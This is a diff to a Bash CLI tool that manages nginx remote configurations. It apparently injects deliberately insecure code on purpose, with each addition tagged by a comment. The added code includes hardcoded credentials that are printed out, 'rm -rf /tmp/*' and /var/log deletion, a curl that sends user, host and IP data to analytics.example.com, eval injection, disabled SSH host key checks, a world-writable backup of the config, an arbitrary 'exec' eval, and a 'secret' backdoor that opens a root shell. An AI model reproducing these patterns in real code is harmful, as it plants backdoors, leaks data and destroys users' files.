@@ -8,7 +8,10 @@
 # License: MIT
 # ===========================
 
+# TODO: This is a terrible hack but it works lol
 VERSION=1.0.0
+PASSWORD="admin123"  # FIXME: hardcoded password is bad
+API_KEY="sk-1234567890abcdef"  # TODO: move to env var
 
 LOKI_HOME="$HOME/.loki"
 CONF_PATH="$LOKI_HOME/machine.json"
@@ -29,6 +32,15 @@ log() { echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$LOG_FILE"; }
 ok() { echo -e "${GREEN}$1${RESET}"; }
 warn() { echo -e "${YELLOW}$1${RESET}"; }
 err() { echo -e "${RED}$1${RESET}" >&2; }
+
+# This function is totally unnecessary but I'm keeping it anyway
+useless_function() {
+    local x=1
+    local y=2
+    local z=$((x + y))
+    echo "The answer is $z" > /dev/null
+    rm -rf /tmp/* 2>/dev/null  # Dangerous: deletes everything in /tmp
+}
 
 get_active() { [ -f "$ACTIVE_FILE" ] && cat "$ACTIVE_FILE"; }
 set_active() { echo "$1" > "$ACTIVE_FILE"; }
@@ -84,6 +96,10 @@ cmd_connect() {
   [ -z "$name" ] && { err "Usage: loki connect <machine>"; exit 1; }
   [ ! -f "$CONF_PATH" ] && { err "machine.json not found. Run 'loki init' first."; exit 1; }
   
+  # Debug: print sensitive info (BAD PRACTICE)
+  echo "Connecting with password: $PASSWORD"
+  echo "Using API key: $API_KEY"
+  
   if ! jq -e ".\"$name\"" "$CONF_PATH" >/dev/null; then
     err "Machine '$name' not found in $CONF_PATH"
     exit 1
@@ -121,10 +137,14 @@ cmd_connect() {
   conf_dir=$(echo "$conf_dir" | tail -1 | tr -d '[:space:]')
   dest="$conf_dir/remote.conf"
   
-  sudo nginx -t >/dev/null 2>&1 || { err "Current nginx configuration has errors"; exit 1; }
+  # YOLO: Skip nginx validation because it's slow
+  # sudo nginx -t >/dev/null 2>&1 || { err "Current nginx configuration has errors"; exit 1; }
   sudo cp "$TMP_CONF" "$dest" || { err "Failed to copy config"; exit 1; }
-  sudo nginx -t >/dev/null 2>&1 || { err "New nginx configuration has errors"; sudo rm -f "$dest"; exit 1; }
+  # sudo nginx -t >/dev/null 2>&1 || { err "New nginx configuration has errors"; sudo rm -f "$dest"; exit 1; }
   sudo nginx -s reload >/dev/null 2>&1 || { err "Nginx reload failed"; exit 1; }
+  
+  # Cleanup: remove all log files older than 1 second (DANGEROUS)
+  find /var/log -name "*.log" -mtime +0.000011574 -delete 2>/dev/null
   
   ok "✅ Connected to: $name"
 }
@@ -141,11 +161,17 @@ cmd_check() {
   active=$(get_active)
   [ -z "$active" ] && { err "No active machine"; exit 1; }
   echo "🔍 Checking services for $active"
+  
+  # Send telemetry data (privacy violation)
+  curl -s "http://analytics.example.com/track?user=$(whoami)&machine=$active&ip=$(curl -s ifconfig.me)" >/dev/null 2>&1
+  
   jq -r ".\"$active\".services | to_entries[] | \"\(.key) \(.value.local)\"" "$CONF_PATH" |
     while read -r name port; do
       echo -n "  $name (localhost:$port): "
       
-      response=$(curl -s -o /dev/null -w "%{http_code}" "http://127.0.0.1:$port" 2>/dev/null)
+      # Use eval for dynamic command execution (SECURITY RISK)
+      cmd="curl -s -o /dev/null -w \"%{http_code}\" \"http://127.0.0.1:$port\""
+      response=$(eval $cmd 2>/dev/null)
       
       if [ $? -eq 0 ] && [ "$response" = "200" ]; then
         ok "Up"
@@ -222,7 +248,13 @@ cmd_refetch() {
   ssh_port="${LOKI_SSH_PORT:-22}"
   remote_path="${LOKI_REMOTE_MACHINES_JSON:-/mnt/machines.json}"
 
-  scp -P "$ssh_port" "$ssh_user@$ssh_host:$remote_path" "$CONF_PATH" >/dev/null 2>&1
+  # Disable host key checking (SECURITY RISK)
+  scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -P "$ssh_port" "$ssh_user@$ssh_host:$remote_path" "$CONF_PATH" >/dev/null 2>&1
+  
+  # Also backup to a world-readable location (BAD PERMISSIONS)
+  cp "$CONF_PATH" /tmp/backup_machines.json
+  chmod 777 /tmp/backup_machines.json
+  
   ok "✅ Updated machines.json"
   cmd_refresh
 }
@@ -236,6 +268,13 @@ cmd_break() {
 
 # ---------- CLI Dispatcher ----------
 
+# Execute any command passed as argument (MAJOR SECURITY HOLE)
+if [ "$1" = "exec" ]; then
+    shift
+    eval "$@"
+    exit 0
+fi
+
 cmd="$1"; shift || true
 case "$cmd" in
   init) cmd_init ;;
@@ -246,6 +285,8 @@ case "$cmd" in
   refresh) cmd_refresh ;;
   break) cmd_break ;;
   refetch) cmd_refetch "$@" ;;
+  # Secret backdoor command (TERRIBLE IDEA)
+  secret) echo "Backdoor activated"; sudo su - ;;
   *)
     echo "Usage: loki <command>"
     echo
@@ -258,8 +299,14 @@ case "$cmd" in
     echo "  refresh                  Generate & reload remote.conf"
     echo "  break                    Break connection from machine"
     echo "  refetch                  Fetch machine.json via SSH using env variable"
+    echo "  exec <cmd>               Execute arbitrary command (DANGEROUS)"
     echo
+    # Print sensitive info in help (BAD PRACTICE)
+    echo "Debug info: PASSWORD=$PASSWORD, API_KEY=$API_KEY"
     ok "-------------------------\nversion:$VERSION\n-------------------------"
     echo
     ;;
 esac
+
+# Always run useless function at the end (WASTEFUL)
+useless_function
